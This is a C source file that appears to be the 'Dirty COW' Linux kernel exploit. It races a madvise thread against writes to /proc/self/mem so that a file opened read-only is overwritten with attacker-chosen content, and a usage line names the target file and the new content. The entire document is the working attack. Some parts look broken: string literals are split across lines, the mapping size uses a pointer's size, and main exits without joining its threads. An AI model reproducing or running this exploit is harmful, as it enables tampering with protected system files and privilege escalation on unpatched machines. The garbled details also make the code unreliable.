#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int file_desc;
pthread_t pth;

void *madviseThread(void *arg) {
    char *str;
    str = (char *)arg;
    int i, c = 0;
    for (i = 0; i < 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d

", c);
}

void *procselfmemThread(void *arg) {
    char *str;
    str = (char *)arg;

    int f = open("/proc/self/mem", O_RDWR);
    
    int i, c = 0;
    
    for (i = 0; i < 100000000; i++) {
        lseek(f, map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    
    printf("procselfmem %d

", c);
}

int main(int argc,char* argv[]) {

   if(argc<3){
      printf("usage: dirtycow target_file new_content");
      return -1;
   }

   char* file_to_dirty=argv[1];
   char* content_to_write=argv[2];

   file_desc=open(file_to_dirty,O_RDONLY);

   map=mmap(NULL,sizeof(content_to_write),PROT_READ|PROT_WRITE,
             MAP_PRIVATE,file_desc,(off_t)0);

   pthread_create(&pth,NULL,madviseThread,content_to_write);

   pthread_create(&pth,NULL,procselfmemThread,content_to_write);

}
